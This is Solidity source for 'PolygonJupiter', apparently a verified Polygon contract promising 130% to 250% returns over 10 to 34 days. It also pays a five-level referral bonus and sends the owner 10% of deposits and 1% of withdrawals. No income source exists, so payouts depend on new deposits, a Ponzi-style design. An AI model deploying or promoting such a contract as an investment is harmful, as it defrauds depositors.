/**
 *Submitted for verification at polygonscan.com on 2021-12-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

struct Tarif {
    uint8 life_days;
    uint16 percent;
}

struct Deposit {
    uint8 tarif;
    uint256 amount;
    uint40 time;
}

struct Investor {
    address referral;
    uint256 dividends;
    uint256 referral_bonus;
    uint40 last_payout;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    Deposit[] deposits;
    uint256[5] structure;
}

contract PolygonJupiter {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public referral_bonus;

    uint8 constant BONUS_LEVELS_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint64 constant WITHDRAW_PERIOD_DAYS = 10;
    uint8[BONUS_LEVELS_COUNT] public ref_bonuses = [90, 45, 30, 15, 7];

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Investor) public investors;

    event Referral(
        address indexed addr,
        address indexed referral,
        uint256 bonus
    );
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event RefPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
        owner = msg.sender;
        uint16 tarifPercent = 130;
        for (uint8 tarifDays = 10; tarifDays <= 34; tarifDays++) {
            tarifs[tarifDays] = Tarif(tarifDays, tarifPercent);
            tarifPercent += 5;
        }
    }

    function contractInfo()
        external
        view
        returns (
            uint256 _invested,
            uint256 _withdrawn,
            uint256 _referral_bonus
        )
    {
        return (invested, withdrawn, referral_bonus);
    }

    function investorInfo(address _addr)
        external
        view
        returns (
            uint256 for_withdrawal,
            uint256 total_invested,
            uint256 total_withdrawn,
            uint256 total_referral_bonus,
            uint256[BONUS_LEVELS_COUNT] memory structure
        )
    {
        Investor storage investor = investors[_addr];

        uint256 payout = this.payoutOf(_addr);

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = investor.structure[i];
        }

        return (
            payout + investor.dividends + investor.referral_bonus,
            investor.total_invested,
            investor.total_withdrawn,
            investor.total_referral_bonus,
            structure
        );
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            investors[_addr].last_payout = uint40(block.timestamp);
            investors[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = investors[_addr].referral;

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;

            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;

            investors[up].referral_bonus += bonus;
            investors[up].total_referral_bonus += bonus;

            referral_bonus += bonus;

            emit RefPayout(up, _addr, bonus);

            up = investors[up].referral;
        }
    }

    function _setReferral(
        address _addr,
        address _referral,
        uint256 _amount
    ) private {
        if (investors[_addr].referral == address(0) && _addr != owner) {
            if (investors[_referral].deposits.length == 0) {
                _referral = owner;
            }

            investors[_addr].referral = _referral;

            emit Referral(_addr, _referral, _amount / 100);

            for (uint8 i = 0; i < BONUS_LEVELS_COUNT; i++) {
                investors[_referral].structure[i]++;

                _referral = investors[_referral].referral;

                if (_referral == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _referral) external payable {
        require(
            _tarif >= 10 && _tarif <= 34 && tarifs[_tarif].life_days > 0,
            "Tarif not found"
        );
        require(msg.value >= 10 ether, "Minimum deposit amount is 10 MATIC");

        Investor storage investor = investors[msg.sender];

        require(
            investor.deposits.length < 100,
            "Max 100 deposits per address are allowed"
        );

        _setReferral(msg.sender, _referral, msg.value);

        investor.deposits.push(
            Deposit({
                tarif: _tarif,
                amount: msg.value,
                time: uint40(block.timestamp)
            })
        );

        investor.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(owner).transfer(msg.value / 10);

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() external {
        Investor storage investor = investors[msg.sender];

        require(
            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) <
                block.timestamp,
            "You can withdraw only after 10 days from your last withdrawal"
        );
        _payout(msg.sender);

        require(
            investor.dividends > 0 || investor.referral_bonus > 0,
            "You need to make a deposit in order to withdraw"
        );

        uint256 amount = investor.dividends + investor.referral_bonus;

        investor.dividends = 0;
        investor.referral_bonus = 0;
        investor.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        payable(owner).transfer(amount / 100);

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) external view returns (uint256 value) {
        Investor storage investor = investors[_addr];

        for (uint256 i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = investor.last_payout > dep.time
                ? investor.last_payout
                : dep.time;
            uint40 to = block.timestamp > time_end
                ? time_end
                : uint40(block.timestamp);
            if (from < to) {
                value +=
                    (dep.amount * (to - from) * tarif.percent) /
                    tarif.life_days /
                    8640000;
            }
        }
        return value;
    }

    function withdrawStatus()
        external
        view
        returns (bool _status, uint256 _nextPayout)
    {
        Investor storage investor = investors[msg.sender];
        return (
            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) <
                block.timestamp,
            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) >
                block.timestamp
                ? investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS)
                : 0
        );
    }

    function getDepositInfo(uint256 _index)
        external
        view
        returns (
            uint8 _tarif,
            uint256 _amount,
            uint40 _time
        )
    {
        Investor storage investor = investors[msg.sender];

        require(
            _index < investor.deposits.length,
            "Index out of range of your deposits"
        );

        return (
            investor.deposits[_index].tarif,
            investor.deposits[_index].amount,
            investor.deposits[_index].time
        );
    }
}